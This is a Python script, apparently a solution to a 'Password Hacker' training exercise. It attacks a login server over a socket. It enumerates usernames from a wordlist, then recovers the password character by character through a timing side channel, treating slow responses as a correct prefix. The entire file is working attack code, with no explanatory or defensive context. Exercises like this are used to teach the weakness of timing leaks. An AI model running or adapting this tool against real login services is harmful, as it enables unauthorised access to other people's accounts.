from argparse import ArgumentParser
from inspect import stack
from json import dumps, loads
from socket import socket
from string import ascii_letters, digits
from time import perf_counter

LOGINS = r"C:\Users\filip\OneDrive\PycharmProjects\Password Hacker (Python)\logins.txt"

ALPHABET = ascii_letters + digits
EXAMPLE_BAD_PASSWORD = " "

WRONG_LOGIN = {"result": "Wrong login!"}
WRONG_PASSWORD = {"result": "Wrong password!"}
BAD_REQUEST = {"result": "Bad request!"}
EXCEPTION = {"result": "Exception happened during login"}
SUCCESS = {"result": "Connection success!"}


class Credentials(dict):
    def __init__(self, login: str, password: str):
        super().__init__(login=login, password=password)

    def to_json(self, indent=None):
        return dumps(self, indent=indent)


def get_address() -> tuple[str, int]:
    parser = ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    args = parser.parse_args()

    return args.host, args.port


def get_logins():
    with open(LOGINS) as f:
        logins = (line.strip() for line in f)
        yield from logins
        raise LookupError(f"{LOGINS=} exhausted without a match!")


def get_passwords():
    password = ""
    while True:
        for character in ALPHABET:
            match = yield password + character
            if match:
                password = match
                yield  # Give None to the send method
                break

        else:
            raise LookupError(f"{ALPHABET=} exhausted without a match!")


def brute_force(client, login=None, threshold=0.01):
    generator = get_logins() if login is None else get_passwords()

    for candidate in generator:
        if login is None:
            credentials = (candidate, EXAMPLE_BAD_PASSWORD)
        else:
            credentials = (login, candidate)

        credentials = Credentials(*credentials)

        start = perf_counter()
        client.send(credentials.to_json().encode())
        response = client.recv(1024)
        time = perf_counter() - start

        response = response.decode()
        response = loads(response)

        if login and response == WRONG_LOGIN:
            function = stack()[0][3]
            raise ValueError(f"Bad login passed into {function}! {login=}")
        if response == BAD_REQUEST:
            raise ValueError(f"Bad credentials! {credentials=}")

        if login is None and response == WRONG_PASSWORD:
            # Found login
            return candidate
        if response == SUCCESS:
            # Found password
            return candidate

        if time > threshold:
            # Found partial password
            generator.send(candidate)


def print_times(client, login):
    times = []
    for i, candidate in zip(range(len(ALPHABET)), get_passwords()):
        credentials = Credentials(login, candidate)

        start = perf_counter()
        client.send(credentials.to_json().encode())
        client.recv(1024)
        time = perf_counter() - start

        times.append(time)

        print(f"{i=:<2}  {time=:.3f}  {candidate=}")

    print(f"   AVERAGE={sum(times) / len(times)}")


def main():
    address = get_address()

    with socket() as client:
        client.connect(address)

        login = brute_force(client)
        # print_times(client, login)
        password = brute_force(client, login)

    credentials = Credentials(login, password)
    print(credentials.to_json())


if __name__ == "__main__":
    main()
